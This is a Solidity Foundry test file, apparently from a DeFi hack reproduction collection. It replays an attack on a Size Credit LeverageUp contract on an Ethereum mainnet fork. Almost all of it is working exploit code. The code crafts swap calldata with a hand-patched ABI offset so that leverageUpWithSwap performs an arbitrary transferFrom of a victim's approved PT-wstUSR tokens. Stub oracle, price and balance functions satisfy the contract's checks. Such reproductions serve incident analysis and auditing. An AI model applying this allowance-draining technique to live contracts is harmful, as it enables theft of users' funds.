// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 19.7k USD
// Attacker : https://etherscan.io/address/0xa7e9b982b0e19a399bc737ca5346ef0ef12046da
// Attack Contract : https://etherscan.io/address/0xa6dc1fc33c03513a762cdf2810f163b9b0fd3a71
// Vulnerable Contract : https://etherscan.io/address/0xf4a21ac7e51d17a0e1c8b59f7a98bb7a97806f14
// Attack Tx : https://etherscan.io/tx/0xc7477d6a5c63b04d37a39038a28b4cbaa06beb167e390d55ad4a421dbe4067f8

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xf4a21ac7e51d17a0e1c8b59f7a98bb7a97806f14#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/SuplabsYi/status/1956306748073230785
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant PT_WSTUSR = 0x23E60d1488525bf4685f53b3aa8E676c30321066;
address constant LEVERAGE_UP = 0xF4a21Ac7e51d17A0e1C8B59f7a98bb7A97806f14;
address constant VICTIM = 0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290;

contract SizeCredit is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 23145764 - 1;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        fundingToken = PT_WSTUSR;
    }

    function testExploit() public balanceLog {
        // Root cause: leverageUpWithSwap lacks check of given data, attacker passed malicious data to execute arbitrary calls
        IERC20 wstUSR = IERC20(PT_WSTUSR);
        uint256 bal = wstUSR.balanceOf(VICTIM);
        uint256 allowance = wstUSR.allowance(VICTIM, LEVERAGE_UP);
        uint256 amount = bal;
        if (allowance < amount) {
            amount = allowance;
        }

        SellCreditMarketParams[] memory marketParams = new SellCreditMarketParams[](1);
        uint256 max = type(uint256).max;
        marketParams[0] = SellCreditMarketParams({
            lender: address(this),
            creditPositionId: max,
            amount: max,
            tenor: max,
            deadline: max,
            maxAPR: max,
            exactAmountIn: true
        });
        SwapParams[] memory swapParams = new SwapParams[](1);

        bytes memory inner = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            VICTIM,
            address(this),
            amount
        );
        bytes memory data = abi.encode(
            32,
            PT_WSTUSR,
            address(this),
            inner
        );

        // Change 0x80 to 0x60
        data[127] = hex"60";
        // console.logBytes(data);

        swapParams[0] = SwapParams({
            method: SwapMethod.GenericRoute,
            data: data
        });

        ILeverageUp(LEVERAGE_UP).leverageUpWithSwap(
            address(this),
            marketParams,
            address(this),
            0,
            1 ether,
            0,
            swapParams
        );
    }

    function riskConfig() public view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        return (
            1 ether + 1,
            type(uint256).max,
            0,
            type(uint256).max,
            0,
            type(uint256).max
        );
    }
   
    function data() public returns(uint256, uint256, address, address, address, address, address, address) {
        return (
            type(uint256).max,
            type(uint256).max,
            PT_WSTUSR,
            address(this),
            address(this),
            address(this),
            address(this),
            address(this)
        );
    }
    function oracle() public returns(address, uint64) {
        return (address(this), uint64(0));
    }
    function getPrice() public returns(uint256) {
        return 1 ether;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns(bool) {
        return true;
    }
    function approve(address spender, uint256 amount) public returns(bool){
        return true;
    }
    function deposit(DepositParams memory param) public {
    }
    function balanceOf(address account) public view returns(uint256) {
        return 2;
    }
    function debtTokenAmountToCollateralTokenAmount(uint256 borrowATokenAmount) public view returns(uint256) {
        return 1;
    }
}

struct DepositParams {
    address token;
    uint256 amount;
    address to;
}

struct SellCreditMarketParams {
    address lender;
    uint256 creditPositionId;
    uint256 amount;
    uint256 tenor;
    uint256 deadline;
    uint256 maxAPR;
    bool exactAmountIn;
}

enum SwapMethod {
    OneInch,
    Unoswap,
    UniswapV2,
    UniswapV3,
    GenericRoute,
    BoringPtSeller,
    BuyPt
}

struct SwapParams {
    SwapMethod method;
    bytes data;
}

interface ILeverageUp {
    function leverageUpWithSwap(
        address size,
        SellCreditMarketParams[] memory sellCreditMarketParamsArray,
        address tokenIn,
        uint256 amount,
        uint256 leveragePercent,
        uint256 borrowPercent,
        SwapParams[] memory swapParamsArray
    ) external;
}